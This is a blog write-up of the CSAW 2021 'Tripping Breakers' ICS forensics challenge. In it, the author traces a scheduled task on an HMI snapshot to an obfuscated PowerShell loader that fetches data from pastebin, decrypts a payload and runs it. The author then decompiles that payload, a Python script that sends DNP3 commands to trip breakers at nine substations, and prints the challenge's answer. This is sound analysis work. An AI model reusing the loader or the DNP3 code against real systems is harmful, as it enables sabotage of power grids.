---
title: 'CSAW 2021: Tripping Breakers'
date: 2021-09-13T00:00:00+00:00
author: Kris
layout: post
image: /images/2021/csaw/trippingtitle.png
categories:
  - Write-Ups
  - ICS
---
Huge year again for CSAW which has some of the longest history of any CTF and always puts a good show on with creative challenges at all levels. I plan to writeup two challenges that got the least solves of the ones I solved. This is the first.

#### <a name="trippingbreakers"></a>Tripping Breakers - ICS - 481 points

This challenge reads:

```
Attached is a forensics capture of an HMI (human machine interface) containing 
scheduled tasks, registry hives, and user profile of an operator account.
There is a scheduled task that executed in April 2021 that tripped various 
breakers by sending DNP3 messages. 

We would like your help clarifying some information. What was the IP address of
the substation_c, and how many total breakers were tripped by this scheduled 
task? 

Flag format: flag{IP-Address:# of breakers}. 

For example if substation_c's IP address was 192.168.1.2 and there were 45 
total breakers tripped, the flag would be flag{192.168.1.2:45}.

Author: CISA

(58 Solves)
```

Along with the challenge comes one file:

- `hmi_host_data.zip - 20mb - sha1sum: 0d21271a9c206eb943377a2d0d0e59c0f97d5bb1`

Unzipping this file gives us a good overview of what we're looking at here, lets break down the ZIP contents top level folder:

```shell
$ ls -lah
total 376K
drwxrwxr-x  4 root root 4.0K Sep 13 20:04 .
drwxr-xr-x  4 root root 4.0K Sep 13 20:04 ..
drwxrwxrwx 16 root root 4.0K Sep  1 12:50 operator
drwxrwxrwx  2 root root 4.0K Sep 12 19:40 Registry
-rwxrwxrwx  1 root root 357K Apr  2 01:50 scheduled_tasks.csv

$ ls -lah Registry/
total 134M
drwxrwxrwx 2 root root 4.0K Sep 13 20:07 .
drwxrwxr-x 4 root root 4.0K Sep 13 20:04 ..
-rwxrwxrwx 1 root root 134M Apr  2 02:11 SOFTWARE_ROOT.json

$ ls -lah operator/
total 64K
drwxrwxrwx 16 root root 4.0K Sep  1 12:50  .
drwxrwxr-x  4 root root 4.0K Sep 13 20:04  ..
drwxrwxrwx  2 root root 4.0K Apr  2 04:49 '3D Objects'
drwxrwxrwx  3 root root 4.0K Sep  1 12:51  AppData
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Contacts
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Desktop
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Documents
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Downloads
drwxrwxrwx  3 root root 4.0K Apr  2 04:50  Favorites
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Links
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Music
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  OneDrive
drwxrwxrwx  4 root root 4.0K Apr  2 04:50  Pictures
drwxrwxrwx  2 root root 4.0K Apr  2 04:50 'Saved Games'
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Searches
drwxrwxrwx  2 root root 4.0K Apr  2 04:50  Videos
```

Ok so looks like a scheduled task log, a registry hive from a Windows machine exported to JSON and a export of an operator's Windows machine home folder.

Since the clue mentions the scheduled task in April 2021 I decided to start there first and loaded the CSV file into Google Sheets and filtered the `Last Run Time` field to April 2021 entries. 99% of the stuff was standard Windows background noise but one task stood out. Mainly because it was called `Lights Off` and was the only task created by a named user `AP-G-DIST-57\Tyrell`

![lights out task](/images/2021/csaw/tripping1.PNG)

This log entry also named the `Task To Run` and this field was set to `Powershell.exe -ExecutionPolicy Bypass %temp%\wcr_flail.ps1`

I set about finding this script which thankfully did exist in the snapshot we had. It contained a Powershell script as expected.

```shell
$ find . -name wcr_flail.ps1
./operator/AppData/Local/Temp/wcr_flail.ps1
$ cat ./operator/AppData/Local/Temp/wcr_flail.ps1
$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($SCOP)); $E=(Get-ItemProperty -Path $SLPH -Name Blast)."Blast";$TWR =  "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR)); $D= (Get-ItemProperty -Path $BRN -Name Off)."Off";openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";C:\1\fate.exe;
```

If we do some basic cleanup its pretty clear what we're doing here:

```powershell
$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");

$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($SCOP)); 

$E=(Get-ItemProperty -Path $SLPH -Name Blast)."Blast";

$TWR =  "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");

$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR)); 

$D= (Get-ItemProperty -Path $BRN -Name Off)."Off";

openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe"

C:\1\fate.exe;
```

The script does this:

1. Fetch some "ciphered" text from [Pastebin](https://pastebin.com/raw/rBXHdE85) and replace certain characters with others. 
2. Decode that base64 blob and extract a second value from the registry path that it decodes to.
3. Decode a second embedded "ciphertext" by replacing characters again.
4. Decode that second base64 blob and get a value from a second registry path.
5. Using openssl, decrypt whatever file the 2nd registry path points to using whatever value we got from the first registry path as the password.
6. Execute the decrypted payload.

I used powershell to decipher the payloads because it was an easy copy+paste away:

```powershell
PS C:\> $SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");

PS C:\> echo $SCOP
SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcVGFibGV0UENcQmVsbA==

PS C:\> $TWR =  "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");

PS C:\> echo $TWR
SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdiZW1cVG93ZXI=
```

Decoding those gives us two registry paths:

- `HKLM:\SOFTWARE\Microsoft\Windows\TabletPC\Bell`
- `HKLM:\SOFTWARE\Microsoft\Wbem\Tower`

Looking in the registry JSON was a pain because it was all on one line, so I used `json.tool` to format it, then grep to find the Values:

```shell
$ cd Registry/
$ cat SOFTWARE_ROOT.json | python -mjson.tool > pretty.json
$ grep -A8 'Microsoft\\\\Windows\\\\TabletPC\\\\Bell' pretty.json
                                    "KeyPath": "ROOT\\Microsoft\\Windows\\TabletPC\\Bell",
                                    "KeyName": "Bell",
                                    "LastWriteTimestamp": "/Date(1617231990846)/",
                                    "SubKeys": [],
                                    "Values": [
                                        {
                                            "ValueName": "Blast",
                                            "ValueType": "RegSz",
                                            "ValueData": "M4RK_MY_W0Rd5",
$ grep -A8 'Microsoft\\\\Wbem\\\\Tower' pretty.json
                            "KeyPath": "ROOT\\Microsoft\\Wbem\\Tower",
                            "KeyName": "Tower",
                            "LastWriteTimestamp": "/Date(1617231936549)/",
                            "SubKeys": [],
                            "Values": [
                                {
                                    "ValueName": "Off",
                                    "ValueType": "RegSz",
                                    "ValueData": "\\EOTW\\151.txt",
```

So we have our values, we're looking for `\EOTW\151.txt` and the password is `M4RK_MY_W0Rd5`. Very sinister! 

Fortunately we have the file in question and we can decrypt it exactly as the schedule task did:

```shell
$ find . -name 151.txt
./operator/AppData/Local/Temp/EOTW/151.txt
$ openssl aes-256-cbc -a -A -d -salt -md sha256 -in ./operator/AppData/Local/Temp/EOTW/151.txt -pass pass:M4RK_MY_W0Rd5 -out "fate.exe"

$ file fate.exe
fate.exe: PE32+ executable (console) x86-64, for MS Windows
```

It worked! Nice. Now to do a little reversing of this binary? Maybe not, a quick look with strings gives away where the binary comes from:

```shell
$ strings fate.exe | tail -5
bunicodedata.pyd
opyi-windows-manifest-filename trip_breakers.exe.manifest
xbase_library.zip
zPYZ-00.pyz
$python36.dll

```

It looks like a PyInstaller bundled application. The $python36.dll also gives away which Python version it was created with. This is important because to extract these it seems is very version dependant. Fortunately I have a Python 3.6 docker image ready for this:

```shell
$ python369
$ cd csaw/tripping/host
$ pyinstxtractor.py fate.exe 
[+] Processing fate.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 36
[+] Length of package: 5716392 bytes
[+] Found 59 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: trip_breakers.pyc
[+] Found 133 files in PYZ archive
[+] Successfully extracted pyinstaller archive: fate.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

It extracts without drama, now to try and decompile, this again, is very sensitive to version.

```shell
$ uncompyle6 trip_breakers.pyc
# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Sep 12 2021, 09:55:07) 
# [GCC 10.2.1 20210110]
# Embedded file name: trip_breakers.py
import struct, socket, time, sys
from crccheck.crc import Crc16Dnp
OPT_1 = 3
OPT_2 = 4
OPT_3 = 66
OPT_4 = 129

class Substation:

    def __init__(self, ip_address, devices):
        self.target = ip_address
        self.devices = []
        self.src = 50
        self.transport_seq = 0
        self.app_seq = 10
        for device in devices:
            self.add_device(device)

        self.connect()

    def connect(self):
        print('Connecting to {}...'.format(self.target))
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.target, 20000))
        print('Connected to {}'.format(self.target))

    def add_device(self, device):
        self.devices.append({'dst':device[0],  'count':device[1]})

    def activate_all_breakers(self, code):
        for device in self.devices:
            dnp3_header = self.get_dnp3_header(device['dst'])
            for x in range(1, device['count'] * 2, 2):
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_1, code)
                self.socket.send(dnp3_packet)
                time.sleep(2)
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_2, code)
                self.socket.send(dnp3_packet)
                time.sleep(5)

    def get_dnp3_header(self, dst):
        data = struct.pack('<H2B2H', 25605, 24, 196, dst, self.src)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        return data

    def get_dnp3_data(self, index, function, code):
        data = struct.pack('<10BIH', 192 + self.transport_seq, 192 + self.app_seq, function, 12, 1, 23, 1, index, code, 1, 500, 0)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        data += struct.pack('<HBH', 0, 0, 65535)
        self.transport_seq += 1
        self.app_seq += 1
        if self.transport_seq >= 62:
            self.transport_seq = 0
        if self.app_seq >= 62:
            self.app_seq = 0
        return data


def main():
    if socket.gethostname() != 'hmi':
        sys.exit(1)
    substation_a = Substation('10.95.101.80', [(2, 4), (19, 8)])
    substation_b = Substation('10.95.101.81', [(9, 5), (8, 7), (20, 12), (15, 19)])
    substation_c = Substation('10.95.101.82', [(14, 14), (9, 16), (15, 4), (12, 5)])
    substation_d = Substation('10.95.101.83', [(20, 17), (16, 8), (8, 14)])
    substation_e = Substation('10.95.101.84', [(12, 4), (13, 5), (4, 2), (11, 9)])
    substation_f = Substation('10.95.101.85', [(1, 4), (3, 9)])
    substation_g = Substation('10.95.101.86', [(10, 14), (20, 7), (27, 4)])
    substation_h = Substation('10.95.101.87', [(4, 1), (10, 9), (13, 6), (5, 21)])
    substation_i = Substation('10.95.101.88', [(14, 13), (19, 2), (8, 6), (17, 8)])
    substation_a.activate_all_breakers(OPT_3)
    substation_b.activate_all_breakers(OPT_4)
    substation_c.activate_all_breakers(OPT_4)
    substation_d.activate_all_breakers(OPT_4)
    substation_e.activate_all_breakers(OPT_3)
    substation_f.activate_all_breakers(OPT_4)
    substation_g.activate_all_breakers(OPT_3)
    substation_h.activate_all_breakers(OPT_4)
    substation_i.activate_all_breakers(OPT_4)


if __name__ == '__main__':
    main()
# okay decompiling trip_breakers.pyc
```

It decompiles nicely! So now we know at least part of the flag. Substation C IP address is `10.95.101.82`. The second part of the flag is trickier.

Theres three possibilities here I see, either:

1. `activate_all_breakers()` method always trips breakers, so therefore every call to this trips all the breakers in the substation.
2. `activate_all_breakers()` only trips breakers when passed `OPT_3`
3. `activate_all_breakers()` only trips breakers when passed `OPT_4`

I hijacked the script to do the counts for me, heres my code below:

```python
OPT_3 = 66
OPT_4 = 129

class Substation:

    def __init__(self, ip_address, devices):
        self.total_breakers = 0
        self.activation_code = 0
        self.target = ip_address
        self.devices = []
        for device in devices:
            self.add_device(device)

        self.connect()

    def connect(self):
        pass

    def add_device(self, device):
        self.total_breakers += device[1]
        self.devices.append({'dst':device[0],  'count':device[1]})

    def activate_all_breakers(self, code):
        self.activation_code = code

def main():

    substation_a = Substation('10.95.101.80', [(2, 4), (19, 8)])
    substation_b = Substation('10.95.101.81', [(9, 5), (8, 7), (20, 12), (15, 19)])
    substation_c = Substation('10.95.101.82', [(14, 14), (9, 16), (15, 4), (12, 5)])
    substation_d = Substation('10.95.101.83', [(20, 17), (16, 8), (8, 14)])
    substation_e = Substation('10.95.101.84', [(12, 4), (13, 5), (4, 2), (11, 9)])
    substation_f = Substation('10.95.101.85', [(1, 4), (3, 9)])
    substation_g = Substation('10.95.101.86', [(10, 14), (20, 7), (27, 4)])
    substation_h = Substation('10.95.101.87', [(4, 1), (10, 9), (13, 6), (5, 21)])
    substation_i = Substation('10.95.101.88', [(14, 13), (19, 2), (8, 6), (17, 8)])
    substation_a.activate_all_breakers(OPT_3)
    substation_b.activate_all_breakers(OPT_4)
    substation_c.activate_all_breakers(OPT_4)
    substation_d.activate_all_breakers(OPT_4)
    substation_e.activate_all_breakers(OPT_3)
    substation_f.activate_all_breakers(OPT_4)
    substation_g.activate_all_breakers(OPT_3)
    substation_h.activate_all_breakers(OPT_4)
    substation_i.activate_all_breakers(OPT_4)

    total3 = 0
    total4 = 0
    for ss in [substation_a, substation_b,substation_c,substation_d,substation_e,substation_f,substation_g,substation_h,substation_i]:
        # OPT_3 is destructive?
        if ss.activation_code == OPT_3:
            total3 += ss.total_breakers
        # OPT_4 is destructive?
        if ss.activation_code == OPT_4:
            total4 += ss.total_breakers

    {% raw %}print("flag{%s:%d}" % (substation_c.target, total4))
    print("flag{%s:%d}" % (substation_c.target, total3))
    print("flag{%s:%d}" % (substation_c.target, total3+total4)){% endraw %}


if __name__ == '__main__':
    main()
```

Which gives me the three possible flags:

```shell
$ ./trip_breakers.py 
flag{10.95.101.82:200}
flag{10.95.101.82:57}
flag{10.95.101.82:257}
```

Of which i tried in reverse order for some reason ! Doh! Anyway the answer was `flag{10.95.101.82:200}`. 200 breakers!



